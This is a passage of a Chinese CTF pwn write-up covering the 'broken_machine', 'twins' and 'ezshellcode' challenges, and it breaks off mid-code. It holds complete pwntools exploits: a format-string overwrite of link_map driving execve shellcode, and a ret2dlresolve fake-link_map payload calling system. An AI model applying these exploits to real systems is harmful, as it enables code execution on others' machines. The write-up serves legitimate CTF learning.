class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000003a</span>  <span class="keyword">if</span> (A == vfork) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x0000002b</span>  <span class="keyword">if</span> (A == accept) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x0000009d</span>  <span class="keyword">if</span> (A == prctl) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000065</span>  <span class="keyword">if</span> (A == ptrace) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0021</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0022</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到基本常用的getshell，orw的都被禁用了</p>
+<p>然后可利用的漏洞就只有sprintf的格式化字符串了，而且还只能用一次%n，题目后面给出了hint<code>栈里面怎么会有ld地址，这是什么</code>，然后调试到栈部分，发现了两个ld地址</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffeeaf26778 —▸ 0x7f6948f8f040 (_rtld_global) —▸ 0x7f6948f902e0 ◂— 0x0</span><br><span class="line">0x7ffeeaf267e0 —▸ 0x7f6948f902e0 ◂— 0x0</span><br></pre></td></tr></table></figure></div>
+
+<p>一个是<code>_rtld_global</code>结构体的地址，一个是<code>_rtld_global</code>结构体的<code>link_map</code>地址，可以都用%n试试，然后就能发现改第二个的时候，程序在<code>exit()</code>的时候会跳转到一个奇怪的地址，比如我们修改它为0x10，调试时在执行sprintf后发出<code>signal SIGSEGV</code>后进入信号处理发现程序崩溃</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000000080 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────[ REGISTERS / show-flags off / show-compact-regsoff]──────────────────────</span><br><span class="line">*RAX  0x403d90 (_DYNAMIC+8) ◂— 0x80</span><br><span class="line">*RBX  0x7f2e26821040 (_rtld_global) —▸ 0x7f2e268222e0 ◂— 0x10</span><br><span class="line"> RCX  0x1</span><br><span class="line">*RDX  0x1</span><br><span class="line">*RDI  0x7f2e26821a48 (_rtld_global+2568) ◂— 0x0</span><br><span class="line">*RSI  0x403d90 (_DYNAMIC+8) ◂— 0x80</span><br><span class="line">*R8   0x7ffdd880a720 —▸ 0x7f2e268222e0 ◂— 0x10</span><br><span class="line">*R9   0x20</span><br><span class="line"> R10  0x0</span><br><span class="line">*R11  0x7ffdd880a650 —▸ 0x7f2e268222e0 ◂— 0x10</span><br><span class="line">*R12  0x0</span><br><span class="line">*R13  0x7f2e26821a48 (_rtld_global+2568) ◂— 0x0</span><br><span class="line">*R14  0x7ffdd880a720 —▸ 0x7f2e268222e0 ◂— 0x10</span><br><span class="line">*R15  0x7f2e268222e0 ◂— 0x10</span><br><span class="line">*RBP  0x7ffdd880a7a0 ◂— 0x0</span><br><span class="line">*RSP  0x7ffdd880a718 —▸ 0x7f2e267ed24e (_dl_fini+526) ◂— mov rax, qword ptr [rbp - 0x38]</span><br><span class="line">*RIP  0x80</span><br><span class="line">───────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────</span><br><span class="line">Invalid address 0x80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp    0x7ffdd880a718 —▸ 0x7f2e267ed24e (_dl_fini+526) ◂— mov rax, qword ptr [rbp - 0x38]</span><br><span class="line">01:0008│ r8 r14 0x7ffdd880a720 —▸ 0x7f2e268222e0 ◂— 0x10</span><br><span class="line">02:0010│        0x7ffdd880a728 —▸ 0x7f2e26822890 —▸ 0x7ffdd89e7000 ◂— jg 0x7ffdd89e7047</span><br><span class="line">03:0018│        0x7ffdd880a730 —▸ 0x7f2e267e54d0 —▸ 0x7f2e265ab000 ◂— 0x3010102464c457f</span><br><span class="line">04:0020│        0x7ffdd880a738 —▸ 0x7f2e26821af0 (_rtld_global+2736) —▸ 0x7f2e267e7000 ◂— 0x3010102464c457f</span><br><span class="line">05:0028│        0x7ffdd880a740 ◂— 0x1efe9660</span><br><span class="line">06:0030│        0x7ffdd880a748 —▸ 0x7ffdd880a740 ◂— 0x1efe9660</span><br><span class="line">07:0038│        0x7ffdd880a750 —▸ 0x7ffdd880a740 ◂— 0x1efe9660</span><br><span class="line">──────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────</span><br><span class="line"> ► f 0             0x80</span><br><span class="line">   f 1   0x7f2e267ed24e _dl_fini+526</span><br><span class="line">   f 2   0x7f2e265f0495 __run_exit_handlers+261</span><br><span class="line">   f 3   0x7f2e265f0610 on_exit</span><br><span class="line">   f 4         0x4012c3 sandbox</span><br><span class="line">   f 5   0x7f2e265ed520 __restore_rt</span><br><span class="line">   f 6         0x4013d1 machine+95</span><br><span class="line">   f 7         0x40150a main+227</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到时<code>_dl_fini</code>中调用了函数指针，该函数调用部分源码如下</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">  ...省略</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">	    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">			    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">			    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">	  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">	    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到我们要调用<code>((fini_t) array[i])()</code>，就得先弄清前面给array赋值和给i赋值的部分，因此来看<code>link_map</code>结构体</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;        <span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">                   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;        <span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;        <span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"> </span><br><span class="line">     <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line">    ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到第一个成员就是<code>l_addr</code>，也就是我们修改的部分。然后调试查看<code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>和<code>l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</code>的值，其中<code>DT_FINI_ARRAY = 26</code> <code>DT_FINI_ARRAYSZ = 28</code>，而<code>d_un</code>为一个共用体，有两个成员<code>d_ptr和d_val</code>。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  l_addr = <span class="number">16</span>,</span><br><span class="line">  l_name = <span class="number">0x7fc3d13e2888</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">  l_ld = <span class="number">0x403d88</span>,</span><br><span class="line">  l_next = <span class="number">0x7fc3d13e2890</span>,</span><br><span class="line">  ...</span><br><span class="line">  l_info = &#123;<span class="number">0x0</span>, <span class="number">0x403d88</span>, <span class="number">0x403e68</span>, <span class="number">0x403e58</span>, <span class="number">0x0</span>, <span class="number">0x403e08</span>, <span class="number">0x403e18</span>, <span class="number">0x403e98</span>, <span class="number">0x403ea8</span>, <span class="number">0x403eb8</span>, <span class="number">0x403e28</span>, <span class="number">0x403e38</span>, <span class="number">0x403d98</span>, <span class="number">0x403da8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x403e78</span>, <span class="number">0x403e48</span>, <span class="number">0x0</span>, <span class="number">0x403e88</span>, <span class="number">0x403ed8</span>, <span class="number">0x403db8</span>, <span class="number">0x403dd8</span>, <span class="number">0x403dc8</span>, <span class="number">0x403de8</span>, <span class="number">0x0</span>, <span class="number">0x403ec8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x403ef8</span>, <span class="number">0x403ee8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x403ed8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x403f08</span>, <span class="number">0x0</span> &lt;repeats <span class="number">25</span> times&gt;, <span class="number">0x403df8</span>&#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>因此<code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>为<code>0x403d78</code>，<code>l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</code>为<code>8</code>，最后调用位置为<code>0x403d90</code>所指向的地址<code>0x80</code>（其实做的时候直接对比下两次不同输入的暂停地址就行了，不需要分析这么多</p>
+<p>因此我们可以通过格式化字符串修改偏移到bss段上buf位置，就可以控制指向任意位置，直接指向shellcode位置然后顺便在sprintf中触发异常信号处理绕过沙箱getshell。（在写shellcode的时候应该注意不要在shellcode中出现\0，因为sprintf会进行0截断，要赋值0直接异或就行了）</p>
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;x86_64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;localhost&#x27;,34657)</span></span><br><span class="line">io = process(<span class="string">&#x27;./broken_machine&#x27;</span>)</span><br><span class="line"></span><br><span class="line">attach(io, <span class="string">&#x27;b machine&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hi there! I\&#x27;ve made a shellcode machine. Could you please input you code to test my machine? Thank you!\n&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xff978cd091969dd0</span></span><br><span class="line"><span class="string">    xor rax, -1</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov rsi, r12</span></span><br><span class="line"><span class="string">    mov rdx, r12</span></span><br><span class="line"><span class="string">    mov rax, r12</span></span><br><span class="line"><span class="string">    mov al, 0x3b</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%1188c%35$hn&#x27;</span>+shellcode.ljust(<span class="number">0xf0</span>, <span class="string">b&#x27;A&#x27;</span>)+<span class="string">b&#x27;%100000c&#x27;</span>+p64(<span class="number">0x104a4</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="twins"><a href="#twins" class="headerlink" title="twins"></a>twins</h2><p><code>checksec</code>看到只开了NX，程序是一个简单的栈溢出程序，除此之外还给出了一个py文件。</p>
+<p>不考虑py文件的话直接ret2libc就可以解决，但那是不可能的</p>
+<p>观察python文件种如下函数</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> a1 <span class="keyword">and</span> a2:</span><br><span class="line">    line = sys.stdin.buffer.readline()</span><br><span class="line">    out1, a1 = interact(p1, line)</span><br><span class="line">    out2, a2 = interact(p2, line)</span><br><span class="line">    <span class="keyword">if</span> out1 != out2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Output conflict!&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;process 1: <span class="subst">&#123;out1&#125;</span>&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;process 2: <span class="subst">&#123;out2&#125;</span>&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(out1[:-<span class="number">1</span>].decode(), flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>远程会同时运行p1，p2两个进程，上述函数表示程序的输出只能一致，否则直接结束，因此考虑到ret2libc必须要泄露libc，而两个程序的libc基址由于存在ASLR机制，因此不可能一致。所以我们可以把这个程序看作一个无输出的栈溢出程序，考虑ret2dlresolve，构造的时候发现工具构造打不通，所以网上随便找个模板然后改下某些值直接用（主要还是因为我是langou，不想自己写</p>
+<p>exp：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./twins&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;localhost&quot;,43677)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./twins&#x27;</span>)</span><br><span class="line">libc=  ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_fake_link_map</span>(<span class="params">elf,fake_linkmap_addr,one_got,offset</span>):</span><br><span class="line">	target_addr = fake_linkmap_addr-<span class="number">8</span>       <span class="comment">#the result you write in</span></span><br><span class="line">	linkmap = p64(offset &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>))       <span class="comment">#l_addr</span></span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">	linkmap += p64(fake_linkmap_addr)       <span class="comment">#l_info[5] dynstr</span></span><br><span class="line">	linkmap += p64(fake_linkmap_addr+<span class="number">0x100</span>) <span class="comment">#l_info[6] dynsym</span></span><br><span class="line">	linkmap = linkmap.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>) </span><br><span class="line">	linkmap += p64(fake_linkmap_addr+<span class="number">0x110</span>) <span class="comment">#l_info[23] jmprel</span></span><br><span class="line">	linkmap += p64(<span class="number">0</span>)+p64(one_got-<span class="number">8</span>)        <span class="comment">#dynmic symtab</span></span><br><span class="line">	linkmap += p64(<span class="number">0</span>)+p64(fake_linkmap_addr+<span class="number">0x120</span>) <span class="comment">#dynmic jmprel</span></span><br><span class="line">	linkmap += p64(target_addr-offset)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>) <span class="comment">#fake_jmprel</span></span><br><span class="line">	<span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">fake_link_map_addr = <span class="number">0x00404000</span> +<span class="number">0x500</span></span><br><span class="line">fake_link_map = build_fake_link_map(elf,fake_link_map_addr,elf.got[<span class="string">&#x27;gets&#x27;</span>],libc.sym[<span class="string">&#x27;system&#x27;</span>]-libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">sh_addr = fake_link_map_addr + <span class="built_in">len</span>(fake_link_map)</span><br><span class="line">prdi = <span class="number">0x401283</span></span><br><span class="line">prsi_r15 = <span class="number">0x401281</span></span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(prdi)+p64(fake_link_map_addr)+p64(elf.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(prdi) + p64(sh_addr) + p64(plt0+<span class="number">6</span>)+p64(fake_link_map_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = fake_link_map+<span class="string">b&#x27;cat flag\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>比赛期间只做出了一半，另一半死活做不出来，感觉bb已经提示到就差把flag直接喂给我了😂，还是我知识面狭窄了，做这题之前连socket都不会用，侧信道爆破也不是很了解（虽然之前见过</p>
+<p>先<code>checksec</code>看到保护全开，<code>seccomp-tools</code>看到接收完输入后就留了三个可用的系统调用</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000028</span>  <span class="keyword">if</span> (A == sendfile) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></div>
+
+<p>然后开IDA找漏洞点，在<code>o0o0o000o()</code>函数中，我们可以发现出题人故意把两个文件描述符和两个缓冲区写的很像<code>flag1  flagl  buf1  bufl</code>，然后就可以发现程序没有关闭flag2的文件描述符，而且没有清空flag1在栈中的缓存。因此根据剩下的系统调用基本确定flag1要用侧信道爆破（至于怎么爆，这思路确实sao），flag2要直接<code>socket connect sendfile</code>到本机。</p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>知道如何得到flag2了，那剩下的就是函数参数的设置问题了，可以自己先在本机上<code>test</code>一下，test程序</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/sendfile.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 